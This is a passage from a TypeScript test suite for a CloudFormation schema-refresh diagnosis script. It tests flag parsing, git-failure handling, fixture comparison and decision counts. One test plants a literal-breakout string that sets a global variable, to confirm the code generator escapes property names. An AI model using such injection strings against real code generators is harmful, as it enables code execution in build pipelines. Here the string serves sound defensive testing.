    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '-property-coverage',
    ]);
    // Refused — by the unknown-flag guard, which sees the token first and names
    // it. Before either guard existed this fabricated a check rendered as
    // `#### \`-property-coverage\``.
    expect(md).toContain('unrecognized flag');
    expect(md).not.toContain('#### ');
  }, 60_000);

  it('refuses a dash-leading value in the GLUED spelling too', () => {
    // The glued branch returned before the dash test, so
    // `--failed-checks=-property-coverage` fabricated exactly the check the
    // space-form guard was written to kill. Both spellings were added to the
    // same function in the same round and never crossed; the case that came
    // with them covered glued-clean and space-dash, never glued-dash.
    for (const spelling of ['--failed-checks=-property-coverage', '--failed-checks=--skipped-log']) {
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [spelling]);
      expect(md, `accepted ${spelling}`).toContain('was given with no value');
      expect(md).not.toContain('no guidance');
    }
    // The SPACE form now trips the unknown-flag guard first, which is the
    // stronger refusal — it names the offending token rather than the flag
    // that swallowed it. Either refusal is correct; neither may render clean.
    const spaced = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '-property-coverage',
    ]);
    expect(spaced).toContain('unrecognized flag');
    expect(spaced).not.toContain('no guidance');
  }, 60_000);

  it('does not answer a check name inherited from Object.prototype', () => {
    // A plain object literal answers for `constructor` / `toString` /
    // `valueOf` with a FUNCTION, which the spread cannot iterate — collapsing
    // the whole diagnosis to the generic failure line instead of rendering an
    // unknown check.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      'constructor',
    ]);
    expect(md).toContain('constructor');
    expect(md).toContain('no guidance');
    expect(md).not.toContain('failed to run');
  }, 60_000);

  it('renders the "Not refreshed" section from a POPULATED skipped log', () => {
    // Every other `--skipped-log` case is a refusal or `/dev/null`, so the
    // parse turning the refresh log's tail into that section had no coverage:
    // replacing its `^AWS::` filter with "any non-empty line" left all cases
    // green.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-skipped-'));
    try {
      const log = join(dir, 'skipped.log');
      writeFileSync(
        log,
        [
          'No entry in the public bundle for these registered types:',
          '  AWS::BedrockAgentCore::Browser',
          '  AWS::BedrockAgentCore::CodeInterpreter',
          'some trailing prose',
        ].join('\n')
      );
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
        '--skipped-log',
        log,
      ]);
      expect(md).toContain('Not refreshed');
      // Asserted against the BULLET lines only: the section's own prose
      // legitimately contains the log header's wording, so a whole-body
      // `not.toContain` fails on correct output.
      const bullets = md
        .split('\n')
        .filter((l) => l.startsWith('- '))
        .join('\n');
      // The EXACT bullet set. A `not.toContain('No entry')` does not
      // discriminate: `renderName` rejects a line with spaces, so a loosened
      // filter renders the header and the prose as
      // `**[name rejected: unexpected characters]**` and the header's words
      // never appear. The guard masks the parse it sits downstream of.
      expect(bullets.split('\n')).toEqual([
        '- `AWS::BedrockAgentCore::Browser`',
        '- `AWS::BedrockAgentCore::CodeInterpreter`',
      ]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('refuses a log path that is a DIRECTORY, naming the cause', () => {
    // It passes `existsSync` and throws `EISDIR` inside `readFileSync`, which
    // collapsed the whole report to the generic one-line failure. Every other
    // refusal here names what was wrong.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--skipped-log',
      tmpdir(),
    ]);
    expect(md).toContain('which is a directory');
  }, 60_000);

  it('refuses an unrecognised flag instead of rendering a clean verdict', () => {
    // Every reader's absent-flag arm is the permissive one, so a typo, a
    // retired flag and a single-dash spelling all rendered as clean.
    // A dash-LESS token too: the first guard tested `startsWith('-')`, so
    // `failed-checks property-coverage` — one spelling over from
    // `-failed-checks` — fell through to the permissive arms and rendered the
    // clean verdict. This script takes no positionals at all.
    for (const bad of [
      '--property-coverage-rc',
      '--failed-check',
      '-failed-checks',
      'failed-checks',
    ]) {
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [bad, 'x']);
      expect(md, `accepted ${bad}`).toContain('unrecognized flag');
      expect(md).not.toContain('Nothing in this refresh needs a decision');
    }
  }, 60_000);

  it('accepts the documented flags in both the space and glued spellings', () => {
    // The inverse: a guard that refused a REAL flag would be caught here
    // rather than in the workflow.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks=property-coverage',
      '--skipped-log',
      '/dev/null',
    ]);
    expect(md).not.toContain('unrecognized flag');
  }, 60_000);

  it('refuses a flag given more than once, in every spelling', () => {
    // `rawArg` reads exactly ONE of them, and which one depends on the
    // spelling: it looks for the glued form first, so the third case below
    // reads 3 while the other two read 0. Either way a value is silently
    // discarded — the last argv shape that still reached a confident answer.
    for (const argv of [
      ['--nested-key-rc', '0', '--nested-key-rc', '3'],
      ['--nested-key-rc=0', '--nested-key-rc=3'],
      ['--nested-key-rc', '0', '--nested-key-rc=3'],
    ]) {
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, argv);
      expect(md, `accepted ${argv.join(' ')}`).toContain('given more than once');
      expect(md).not.toContain('Nothing in this refresh needs a decision');
    }
  }, 60_000);

  it('renders a case-divergence without asking npm anything', () => {
    const md = run(
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.\n' +
        '  AWS::ECS::Service: someKey [case-divergence] (SDK models `SomeKey`)\n'
    );
    expect(md).toContain('AWS::ECS::Service');
    expect(md).toContain('someKey');
    expect(md).toContain('case-divergence');
    // The lag section is the network-touching one and a case divergence must
    // not reach it.
    expect(md).not.toContain('Installed vs published');
  }, 60_000);
});

describe('collectFixtureDeltas', () => {
  const base = {
    providerFiles: new Map([['AWS::Glue::Connection', 'src/provisioning/providers/glue-provider.ts']]),
    declared: new Map([['AWS::Glue::Connection', new Set(['OldProp'])]]),
    declarationCandidates: () => [],
    sdkEvidence: () => undefined,
  };
  // The REAL fixture shape, checked against `tests/fixtures/cfn-schemas/`:
  // `properties` is an array of bare names and `readOnlyProperties` likewise.
  // The first draft of this helper used an object map and `/properties/X`
  // paths, and every case reported an empty delta — a fixture that does not
  // encode what its consumer reads proves nothing about the consumer.
  const fixture = (props: string[], readOnly: string[] = []) =>
    JSON.stringify({
      resourceType: 'AWS::Glue::Connection',
      properties: props,
      readOnlyProperties: readOnly,
    });

  it('COUNTS a fixture whose comparison threw, rather than skipping it', () => {
    // The branch that could be deleted with the whole suite green. A type that
    // throws vanishes from the removal AND the addition accounting at once, so
    // the residue reads as "additions only" rather than as silent — and the
    // renderer, which IS pinned, never sees that it happened.
    const out = collectFixtureDeltas({
      ...base,
      files: ['broken.json'],
      committedOf: () => '{ not json',
      currentOf: () => fixture(['A']),
    });
    expect(out.unreadable).toEqual(['broken.json']);
    expect(out.removed).toEqual([]);
    expect(out.writableAdded).toEqual([]);
  });

  it('COUNTS a fixture whose committed side could not be READ', () => {
    // `git show` failing (git absent, a broken repo, the 32 MB buffer) used to
    // be `undefined` — the same value as "not in HEAD" — so every fixture
    // looked brand-new and the whole refresh looked clean, over a step that
    // only runs when drift exists.
    let readCurrent = 0;
    const out = collectFixtureDeltas({
      ...base,
      files: ['AWS-Glue-Connection.json'],
      committedOf: () => UNREADABLE,
      currentOf: () => {
        readCurrent += 1;
        return fixture(['A']);
      },
    });
    expect(out.unreadable).toEqual(['AWS-Glue-Connection.json']);
    // Discriminating: without the explicit branch the sentinel falls through to
    // `comparePropertySets`, which throws and lands in the SAME list — the same
    // answer by accident. Reaching the current side at all is the difference,
    // and it is the wasteful, fragile path.
    expect(readCurrent, 'the sentinel fell through to the comparison').toBe(0);
  });

  it('classifies real git failures: path-not-in-HEAD is new, the rest are unreadable', () => {
    // Measured against real git output. `unknown revision` and `invalid object`
    // are whole-REVISION failures — an unborn HEAD says
    // `fatal: invalid object name 'HEAD'` — and matching them as "brand-new"
    // made every fixture look new and the refresh look clean, the exact
    // fail-open this classification closes. Neither can match a genuine
    // path-not-in-HEAD, which says `does not exist in 'HEAD'`.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-git-'));
    try {
      execFileSync('git', ['init', '-q', dir]);
      // Unborn HEAD: a whole-revision failure, NOT a missing path.
      const unborn = (() => {
        try {
          execFileSync('git', ['show', 'HEAD:anything'], { cwd: dir, encoding: 'utf8' });
          return '';
        } catch (e) {
          return String((e as { stderr?: unknown }).stderr ?? '');
        }
      })();
      expect(unborn, 'git no longer reports an unborn HEAD this way').not.toBe('');
      // The CLASSIFICATION, not just what git prints: matching the
      // whole-revision wording as "brand-new" is what made a broken repository
      // render the refresh as clean.
      expect(classifyGitShowFailure(unborn)).toBe(UNREADABLE);

      // And the genuine path-not-in-HEAD, from a repo that HAS a commit.
      writeFileSync(join(dir, 'seed.txt'), 'x');
      execFileSync('git', ['-C', dir, 'add', 'seed.txt']);
      execFileSync('git', ['-C', dir, '-c', 'user.email=t@e', '-c', 'user.name=t', 'commit', '-qm', 's']);
      const missing = (() => {
        try {
          execFileSync('git', ['show', 'HEAD:nope.json'], { cwd: dir, encoding: 'utf8' });
          return '';
        } catch (e) {
          return String((e as { stderr?: unknown }).stderr ?? '');
        }
      })();
      expect(classifyGitShowFailure(missing)).toBeUndefined();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('treats a git failure with no recognisable wording as unreadable', () => {
    // ENOENT and ENOBUFS both surface with empty stderr — the safe direction is
    // "could not read", never "brand-new".
    expect(classifyGitShowFailure('')).toBe(UNREADABLE);
    expect(classifyGitShowFailure('fatal: not a git repository')).toBe(UNREADABLE);
  });

  it('falls back to the filename as a TYPE name, not as a filename', () => {
    // A fixture missing `resourceType` yields the stem, which is hyphenated —
    // and `renderName` rejects hyphens, so the heading became
    // `**[name rejected]**`. The declared-property lookup misses either way,
    // but a legible heading says which type it missed for. Same shape as the
    // two render sites the previous two rounds fixed.
    const out = collectFixtureDeltas({
      ...base,
      files: ['AWS-Glue-Connection.json'],
      committedOf: () => JSON.stringify({ properties: ['A'] }),
      currentOf: () => JSON.stringify({ properties: [] }),
      declared: new Map([['AWS::Glue::Connection', new Set(['A'])]]),
    });
    expect(out.removed[0]!.resourceType).toBe('AWS::Glue::Connection');
    const md = renderDiagnosis({
      removed: out.removed,
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('rejected');
  });

  it('skips a BRAND-NEW fixture silently, which is not the same thing', () => {
    // No committed side means nothing to compare, not something unreadable —
    // counting it would put every newly captured type in the warning list.
    const out = collectFixtureDeltas({
      ...base,
      files: ['new.json'],
      committedOf: () => undefined,
      currentOf: () => fixture(['A']),
    });
    expect(out.unreadable).toEqual([]);
    expect(out.writableAdded).toEqual([]);
  });

  it('looks the provider up by RESOURCE TYPE, and stores what it found', () => {
    // The four original cases asserted only the counts, and `base` stubs both
    // collaborators to ignore their arguments — so keying the provider lookup
    // on the FILENAME instead of the type, dropping the SDK evidence, and
    // dropping the rename pairing were each invisible. The SDK evidence is
    // fact #2 of this script's whole purpose.
    const seen: Array<[string, string | undefined, string | undefined]> = [];
    const out = collectFixtureDeltas({
      ...base,
      files: ['AWS-Glue-Connection.json'],
      committedOf: () => fixture(['OldProp']),
      currentOf: () => fixture(['OldPropV2'], []),
      declarationCandidates: (property, providerRelPath, resourceType) => {
        seen.push([property, providerRelPath, resourceType]);
        return ['src/provisioning/providers/glue-provider.ts:42'];
      },
      sdkEvidence: (property, providerRelPath) => ({
        client: `client-for:${providerRelPath}`,
        modelled: true,
      }),
    });
    // Looked up by TYPE — the filename would resolve to nothing in the map.
    expect(seen).toEqual([
      ['OldProp', 'src/provisioning/providers/glue-provider.ts', 'AWS::Glue::Connection'],
    ]);
    const entry = out.removed[0]!;
    expect(entry.providerPath).toBe('src/provisioning/providers/glue-provider.ts');
    expect(entry.candidates['OldProp']).toEqual([
      'src/provisioning/providers/glue-provider.ts:42',
    ]);
    expect(entry.sdk!['OldProp']!.client).toBe(
      'client-for:src/provisioning/providers/glue-provider.ts'
    );
    // And the rename pairing runs against THIS delta's writable additions.
    expect(entry.renameCandidates!['OldProp']).toEqual(['OldPropV2']);
  });

  it('reports a removal only when the provider DECLARES the property', () => {
    const out = collectFixtureDeltas({
      ...base,
      files: ['glue.json'],
      committedOf: () => fixture(['OldProp', 'Undeclared']),
      currentOf: () => fixture([]),
    });
    expect(out.removed).toHaveLength(1);
    expect(out.removed[0]!.properties).toEqual(['OldProp']);
  });

  it('splits an addition by whether it is settable', () => {
    const out = collectFixtureDeltas({
      ...base,
      files: ['glue.json'],
      committedOf: () => fixture([]),
      currentOf: () => fixture(['Settable', 'ComputedArn'], ['ComputedArn']),
    });
    expect(out.writableAdded).toEqual([
      { resourceType: 'AWS::Glue::Connection', properties: ['Settable'] },
    ]);
    expect(out.readOnlyAddedCount).toBe(1);
  });
});

describe('the module’s own doc comments', () => {
  /**
   * The orphan predicate, extracted so it can be driven with SHAPES rather than
   * only pointed at the real file. Pointed only at the file, the rule this
   * round widened — a one-line type annotation ATTACHES — had no case at all:
   * the probe that exercises it restores a shape the fence now accepts, so it
   * is green either way.
   */
  const orphansIn = (src: string): string[] => {
    const lines = src.split('\n');
    const found: string[] = [];
    let blockStart = -1;
    let seenBlocks = 0;
    for (let i = 0; i < lines.length; i++) {
      if (lines[i]!.trim() === '/**') blockStart = i;
      if (lines[i] !== ' */') continue;
      seenBlocks += 1;
      const body = lines.slice(blockStart, i).join('\n');
      // The FILE header documents the module and a `@typedef`-only block
      // documents types; neither attaches to a declaration.
      const attaches = seenBlocks > 1 && !/@typedef/.test(body);
      const nextLine = (lines[i + 1] ?? '').trim();
      const declares =
        // `declare` / `interface` / `type` are the DECLARATION-FILE spellings.
        // Without them this predicate could not be pointed at the `.d.mts` at
        // all, and that is where the orphan it exists to catch actually landed
        // (issue go-to-k/cdkd#2858): a new `export declare function` inserted
        // between `writeAutoTolerated`'s block and its own signature.
        /^(export\s+)?(export\s+default\s+)?(declare\s+)?(async\s+)?(function|class|const|let|var|interface|type)\s/.test(
          nextLine
        ) || /^\/\*\*.*\*\/$/.test(nextLine);
      if (attaches && !declares) found.push(`line ${i + 2}: ${JSON.stringify(nextLine)}`);
    }
    return found;
  };

  const withHeader = (tail: string) => ['/**', ' * header', ' */', '', tail].join('\n');

  it('flags a block followed by a blank line, another block, or a comment', () => {
    expect(orphansIn(withHeader('/**\n * doc\n */\n\nexport function f() {}'))).toHaveLength(1);
    expect(
      orphansIn(withHeader('/**\n * a\n */\n/**\n * b\n */\nexport function f() {}'))
    ).toHaveLength(1);
    expect(orphansIn(withHeader('/**\n * doc\n */\n// stray\nexport function f() {}'))).toHaveLength(
      1
    );
  });

  it('accepts every shape that really does attach', () => {
    // The one-line type annotation is the ordinary JSDoc way to type a `const`.
    // The first cut flagged it, so the module was edited to suit the fence
    // rather than the other way round.
    for (const tail of [
      '/**\n * doc\n */\nexport function f() {}',
      '/**\n * doc\n */\nfunction f() {}',
      '/**\n * doc\n */\nexport const x = 1;',
      '/**\n * doc\n */\nexport default function f() {}',
      '/**\n * doc\n */\n/** @type {string} */\nexport const x = "a";',
      '/**\n * @typedef {A} B\n */\n\nconst unrelated = 1;',
    ]) {
      expect(orphansIn(withHeader(tail)), `flagged an attached shape: ${tail}`).toEqual([]);
    }
  });

  it('finds none in the real module', () => {
    // BOUND, stated because an over-claimed fence is what this file keeps
    // finding: it cannot see an undocumented declaration slipped BETWEEN a
    // docblock and its function — that still reads as "block, then a
    // declaration". Nothing else covers that shape either: `checkJs` appears in
    // NO tsconfig and NO workflow here, so the runs that caught two of this
    // session's orphan incidents were by hand, not a control.
    const src = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'), 'utf8');
    expect(orphansIn(src), 'a docblock is not attached to a declaration').toEqual([]);
    expect(src.split('\n').filter((l) => l === ' */').length).toBeGreaterThan(20);
  });

  it('holds for the DECLARATION file too', () => {
    // The `.mjs` arm above is where this predicate has always pointed, and the
    // orphan it exists to catch landed in the `.d.mts` instead (issue
    // go-to-k/cdkd#2858). The SHAPE matters, because it is what makes the
    // incident catchable at all: a new declaration was inserted WITH ITS OWN
    // DOCBLOCK between `writeAutoTolerated`'s docblock and its signature, so
    // the file read `block, block, declaration` — and `block followed by
    // another block` is the one orphan spelling this predicate detects. A
    // declaration inserted WITHOUT a docblock would read as
    // `block, declaration` and pass, which is the bound the `.mjs` arm above
    // states. Caught by review, by nothing mechanical.
    const src = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.d.mts'), 'utf8');
    expect(orphansIn(src), 'a docblock is not attached to a declaration').toEqual([]);
    // BOUND, stated rather than implied: `orphansIn` matches ` */` EXACTLY, so
    // it examines only the 7 top-level docblocks here and not the 5 INDENTED
    // interface-member ones (`SdkLagRow.matched`, `DiagnosisInput`'s members),
    // where the same class — a member inserted between a docblock and its
    // symbol — is equally reachable. Widening the predicate to indented blocks
    // is a change to the shared `.mjs` arm too, so it is not made here.
    //
    // Non-vacuity: the widened `declares` regex must actually MATCH this
    // file's spellings, or every block would read as unattached and the
    // assertion above would be reporting on a parse that found nothing.
    expect(src).toMatch(/^export declare function /m);
    expect(src).toMatch(/^export interface /m);
    // Measured 7 at the tip; a floor of 5 fails on a collapse, not on an edit.
    // It counts ` */` in the SOURCE, independent of `orphansIn` — so it bounds
    // the file, not the predicate's reach; the two assertions above are what
    // say the predicate parsed this file's spellings.
    expect(src.split('\n').filter((l) => l === ' */').length).toBeGreaterThan(5);
  });
});

describe('the script\u2019s own synopsis', () => {
  const SRC = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'), 'utf8');
  const header = SRC.slice(0, SRC.indexOf(' */'));

  it('documents exactly the flags it accepts', () => {
    // It documented `--property-coverage-rc` for two rounds after
    // `--failed-checks` replaced it, and named `--failed-checks` nowhere — so
    // following the script's OWN usage produced "additions only" over a red
    // check, the verdict six rounds went into closing, reached through the
    // documentation. Both directions, so a new flag cannot ship undocumented
    // and a retired one cannot linger.
    // The SYNOPSIS, not the whole docblock: matching across the header let a
    // flag survive in prose while being dropped from the invocation, which is
    // the half a reader copies — and the assertion message said "synopsis".
    const lines = header.split('\n').map((l) => l.replace(/^\s*\*\s?/, ''));
    // EVERY invocation block, not just the first: the synopsis grew a second
    // form (`--umbrella-checklist`, which takes no other flag), and reading
    // only the first block dropped its flag from the derived set while the
    // assertion still claimed to cover the synopsis.
    const synopsis: string[] = [];
    let found = 0;
    for (let i = 0; i < lines.length; i++) {
      if (!lines[i]!.includes('node scripts/diagnose-schema-refresh.mjs')) continue;
      found += 1;
      for (let j = i; j < lines.length && lines[j]!.trim() !== ''; j++) synopsis.push(lines[j]!);
    }
    expect(found, 'the synopsis no longer shows an invocation').toBeGreaterThan(0);
    const documented = [...synopsis.join('\n').matchAll(/(--[a-z][a-z-]*)/g)].map((m) => m[1]!);
    expect(new Set(documented), 'the synopsis and the accepted set disagree').toEqual(
      new Set(KNOWN_FLAGS)
    );
  });

  it('has a synopsis that would actually paste', () => {
    // Line 39 ended `\\`, which terminates the command in bash and passes a
    // literal backslash — the same class the guidance's command block is
    // fenced for, one file over and unfenced.
    const lines = header.split('\n');
    const start = lines.findIndex((l) => l.includes('node scripts/diagnose-schema-refresh.mjs'));
    expect(start, 'the synopsis no longer shows the invocation').toBeGreaterThan(-1);
    for (let i = start; i < lines.length; i++) {
      const body = lines[i]!.replace(/^\s*\*\s?/, '');
      if (body.trim() === '') break;
      const isLast = i + 1 >= lines.length || lines[i + 1]!.replace(/^\s*\*\s?/, '').trim() === '';
      if (isLast) {
        expect(body.endsWith('\\'), `the last synopsis line dangles a continuation`).toBe(false);
      } else {
        // Exactly one. A DOUBLED backslash terminates the command and passes a
        // literal `\`; a MISSING one ends the command early. The first fence
        // covered only the doubled spelling — the same one-spelling shape it
        // was written to catch.
        expect(body.endsWith('\\'), `line ${i + 1} does not continue`).toBe(true);
        expect(body.endsWith('\\\\'), `line ${i + 1} ends in a DOUBLED backslash`).toBe(false);
      }
    }
  });

});

describe('assertFixtureFloor', () => {
  it('refuses an EMPTY listing rather than reporting from it', () => {
    // The last input in the module without a floor. Empty yields empty
    // removals AND empty additions, which renders as "additions only" — every
    // sibling input already refuses a short read.
    expect(() => assertFixtureFloor(0, 134)).toThrow(/no schema fixtures found/);
  });

  it('refuses a listing far short of the coverage table', () => {
    expect(() => assertFixtureFloor(3, 134)).toThrow(/far short of the coverage table/);
  });

  it('is reached by the real run — an empty fixtures dir refuses end to end', () => {
    // Replaces a source-shape assertion that claimed "no seam reaches this
    // call site". That was false, and the assertion could not see the call
    // wrapped in `try {} catch {}` — which measured as printing the exact
    // clean verdict the floor exists to prevent. `--fixtures-dir=` makes the
    // real path testable.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-empty-fixtures-'));
    try {
      let out = '';
      try {
        out = execFileSync(
          'node',
          [
            join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'),
            `--fixtures-dir=${dir}`,
          ],
          { encoding: 'utf8' }
        );
      } catch (e) {
        out = String((e as { stdout?: unknown }).stdout ?? '');
      }
      expect(out).toContain('no schema fixtures found');
      expect(out).not.toContain('Nothing in this refresh needs a decision');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('compares against the SEAM directory, not the real committed fixtures', () => {
    // Shipped UNPINNED last round on the grounds that a discriminating case
    // needed a non-empty seam directory the floor would refuse. True, and it
    // does not make it hard: copying the real fixtures clears the floor in one
    // call and the whole case runs in about a second.
    //
    // With `committedOf` following the seam, git cannot resolve a path outside
    // the repository and every fixture lands in "could not read". With the
    // hard-coded path it resolves the REAL committed fixture and diffs it
    // against scratch content — fabricating a removal, with a provider line
    // number, for a property AWS never removed.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-seam-'));
    try {
      cpSync(join(REPO_ROOT, 'tests/fixtures/cfn-schemas'), dir, { recursive: true });
      const target = join(dir, 'AWS-S3-Bucket.json');
      const fixture = JSON.parse(readFileSync(target, 'utf8'));
      expect(fixture.properties, 'the anchor fixture no longer declares it').toContain('BucketName');
      fixture.properties = fixture.properties.filter((x: string) => x !== 'BucketName');
      writeFileSync(target, JSON.stringify(fixture, null, 2));

      let out = '';
      try {
        out = execFileSync(
          'node',
          [join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'), `--fixtures-dir=${dir}`],
          { encoding: 'utf8' }
        );
      } catch (e) {
        out = String((e as { stdout?: unknown }).stdout ?? '');
      }
      expect(out, 'a removal was fabricated from the real committed fixture').not.toContain(
        'Properties AWS removed'
      );
      expect(out).not.toContain('BucketName');
      expect(out).toContain('could not read');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('accepts the real tree, and does not fire when the table is empty', () => {
    // Bound to the DECLARED count rather than a constant: the two move
    // together, so a hand-picked number goes stale. Driven by the real
    // directory so a future refresh cannot silently cross the floor.
    const files = readdirSync(join(REPO_ROOT, 'tests/fixtures/cfn-schemas')).filter(
      (f) => f.endsWith('.json') && !f.startsWith('_')
    );
    const declared = loadDeclaredProperties();
    expect(files.length).toBeGreaterThan(100);
    expect(() => assertFixtureFloor(files.length, declared.size)).not.toThrow();
    // (`assertFixtureFloor(1, 0)` was asserted here and could not fail:
    // `1 * 2 < 0` is false whatever the guard does. The dead `declaredCount > 0`
    // conjunct it was written for is gone.)
  });
});

describe('the sibling type declarations', () => {
  it('type-checks on their own', () => {
    // Nothing in CI type-checks `scripts/**`: `tsconfig.json` includes only
    // `src/**` + `types/**`, and `tsconfig.test.json` takes `scripts/**\/*.ts`,
    // not `.d.mts`. A duplicated `KNOWN_FLAGS` declaration therefore sat in
    // this file until review found it by running tsc by hand — and
    // `skipLibCheck` hides exactly that class.
    const out = spawnSync(
      'npx',
      [
        'tsc',
        '--ignoreConfig',
        '--noEmit',
        '--skipLibCheck',
        'false',
        join(REPO_ROOT, 'scripts/diagnose-schema-refresh.d.mts'),
      ],
      { encoding: 'utf8' }
    );
    expect(`${out.stdout}${out.stderr}`.trim(), 'the declarations do not type-check').toBe('');
    expect(out.status).toBe(0);
  }, 120_000);
});

describe('the generated-module renderers', () => {
  it('escapes a name that would otherwise close the literal', async () => {
    // The fix had NO test: reverting both renderers to hand-quoting left 3041
    // cases green. A property name comes from AWS's public bundle, and this
    // module is executed by the refresh workflow, by the bot PR's own CI, and
    // shipped to npm — so a name closing the literal is code execution, not a
    // broken file.
    const { renderHandled, renderSilentDrop } = await import(
      '../../../scripts/gen-property-coverage.ts'
    );
    const hostile = "zzz', (globalThis.OWNED = 1)] // ";

    const handled = renderHandled([hostile]);
    expect(handled, 'the name closed its own literal').not.toContain("'zzz',");
    expect(handled).toContain(JSON.stringify(hostile));

    const drops = renderSilentDrop([[hostile, 'because']]);
    expect(drops).not.toContain("['zzz',");
    expect(drops).toContain(JSON.stringify(hostile));

    // A weaker check than it looks, stated as such: `new Function` parses
    // `new Set<string>([...])` as relational operators, not as the TypeScript
    // it is — so this does NOT prove the emission is valid TS. It does throw on
    // the hostile emission, which is the discrimination being bought here; the
    // TS validity of the whole module is covered by the build.
    expect(() => new Function(`return ${handled}`)).not.toThrow();
    expect(() => new Function(`return ${drops}`)).not.toThrow();
  });

  it('escapes the TYPE key too, not only the two renderers', async () => {
    // The third site this PR escaped, and the one the cases missed: the
    // rationale comment says "in BOTH renderers", which excludes the entry key
    // by wording. Its input is provider-source-derived rather than
    // bundle-derived, so this is a test gap and not an exposure — but a raw
    // interpolation left beside two hardened ones is the ambiguity the comment
    // exists to remove.
    const mod = await import('../../../scripts/gen-property-coverage.ts');
    const src = readFileSync(join(REPO_ROOT, 'scripts/gen-property-coverage.ts'), 'utf8');
    expect(mod).toBeDefined();
    // The emitted entry key must go through JSON.stringify like its siblings.
    expect(src, 'the entry key is interpolated raw').not.toMatch(/^\s*'\$\{type\}',$/m);
    expect(src).toMatch(/\$\{JSON\.stringify\(type\)\},/);
  });

  it('emits DOUBLE quotes, which the formatter normalises back', async () => {
    // The committed module is regenerated in CI and diffed byte-for-byte, so
    // the quote change `JSON.stringify` introduces must be undone by `vp run
    // format` (`singleQuote: true`) — which the workflow and the CI staleness
    // guard both run before diffing. Asserting the raw emission keeps that
    // dependency visible instead of implicit.
    const { renderHandled } = await import('../../../scripts/gen-property-coverage.ts');
    expect(renderHandled(['Alpha'])).toContain('"Alpha"');
    expect(renderHandled(['Alpha'])).not.toContain("'Alpha'");
  });
});

describe('countDecisions', () => {
  // The count a refresh PR is MARKED with. It is the same predicate the report
  // writes its "additions only" line from, and the two being one function is
  // the property under test — a second, agreeing copy is what goes stale.
  const none = { removed: [], divergences: [] };

  it('counts each of the six inputs, including the two with no section', () => {
    // `nestedKeyUnparsed` and `unreadable` render no `### … a decision is
    // needed` heading of their own, which is exactly why a hand-written second
    // copy forgets them: an unparsed checker log and an unreadable fixture are
    // decisions with nothing on the page to remind a reader they exist.
    expect(countDecisions(none)).toBe(0);
    expect(
      countDecisions({
        ...none,
        removed: [{ resourceType: 'A', properties: ['x'], candidates: {}, sdk: {} }],
      })
    ).toBe(1);
    expect(
      countDecisions({
        ...none,
        divergences: [{ resourceType: 'A', nestedKey: 'k', bucket: 'no-sdk-member', detail: 'd' }],
      })
    ).toBe(1);
    expect(countDecisions({ ...none, nestedKeyUnparsed: true })).toBe(1);
    expect(countDecisions({ ...none, failedChecks: ['property-coverage'] })).toBe(1);
    expect(countDecisions({ ...none, unreadable: ['A'] })).toBe(1);
    // The sixth input had no arm of its own — the title said "five" for as long
    // as `pendingSdkBump` existed. Counted per BUMP, so two findings sharing a
    // client are ONE decision, which is the property a per-finding copy loses.
    const bump = {
      resourceType: 'A',
      nestedKey: 'k',
      bucket: 'definition-member-missing',
      detail: 'd',
      client: '@aws-sdk/client-glue',
      installed: '1.0.0',
      latest: '2.0.0',
      definition: 'I',
      member: 'm',
    };
    expect(countDecisions({ ...none, pendingSdkBump: [bump] })).toBe(1);
    expect(countDecisions({ ...none, pendingSdkBump: [bump, { ...bump, nestedKey: 'k2' }] })).toBe(
      1
    );
  });

  it('counts a multi-property removal ONCE — the unit is the judgement', () => {
    // A type losing three properties is settled by one decision, and the title
    // suffix says "N decisions needed". Counting properties would inflate it.
    expect(
      countDecisions({
        ...none,
        removed: [
          {
            resourceType: 'A',
            properties: ['x', 'y', 'z'],
            candidates: {},
            sdk: {},
          },
        ],
      })
    ).toBe(1);
  });

  it('agrees with the report it is rendered beside, in BOTH directions', () => {
    // The structural claim. If these two could disagree, a PR could be marked
    // "no decisions needed" while the body beneath the title lists several —
    // and that is the shape this file's argv guards already had to close once.
    const cases: Array<Record<string, unknown>> = [
      { removed: [], divergences: [], writableAdded: [], skipped: [] },
      {
        removed: [
          {
            resourceType: 'AWS::S3::Bucket',
            properties: ['Gone'],
            candidates: { Gone: ['src/provisioning/providers/s3-provider.ts:1'] },
            sdk: {},
          },
        ],
        divergences: [],
        writableAdded: [],
        skipped: [],
      },
      {
        removed: [],
        divergences: [
          {
            resourceType: 'AWS::Glue::Connection',
            nestedKey: 'BasicAuthenticationCredentials',
            bucket: 'definition-member-missing',
            detail: 'd',
          },
        ],
        writableAdded: [],
        skipped: [],
      },
      { removed: [], divergences: [], writableAdded: [], skipped: [], nestedKeyUnparsed: true },
      { removed: [], divergences: [], writableAdded: [], skipped: [], unreadable: ['AWS::A::B'] },
      {
        removed: [],
        divergences: [],
        writableAdded: [],
        skipped: [],
        failedChecks: ['property-coverage'],
      },
    ];
    for (const c of cases) {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const md = renderDiagnosis(c as any);
      const saysClean = md.includes('Nothing in this refresh needs a decision');
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = countDecisions(c as any);
